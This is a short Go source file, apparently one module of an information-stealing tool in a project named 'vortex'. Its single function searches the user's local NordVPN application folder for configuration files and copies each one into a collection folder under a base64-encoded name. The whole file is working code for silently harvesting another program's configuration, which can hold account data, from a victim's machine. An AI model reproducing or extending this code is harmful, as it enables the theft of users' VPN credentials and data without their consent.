package vpn

import (
	"os"
	"path/filepath"
	"vortex/encrypt"
	"vortex/hutil"
)

func NordvpnConfigCoping(mainFolder string) error {

	nordvpnPath := filepath.Join(os.Getenv("LOCALAPPDATA"), "NordVPN")

	nordvpnConfigs, err := hutil.FindFilesExt(nordvpnPath, ".config")
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		return err
	}

	for i := range nordvpnConfigs {
		if err = hutil.CopyFile(nordvpnConfigs[i], filepath.Join(mainFolder, encrypt.B64Util("nordvpn-"+filepath.Base(nordvpnConfigs[i]), 0))); err != nil {
			return err
		}
	}
	return nil
}
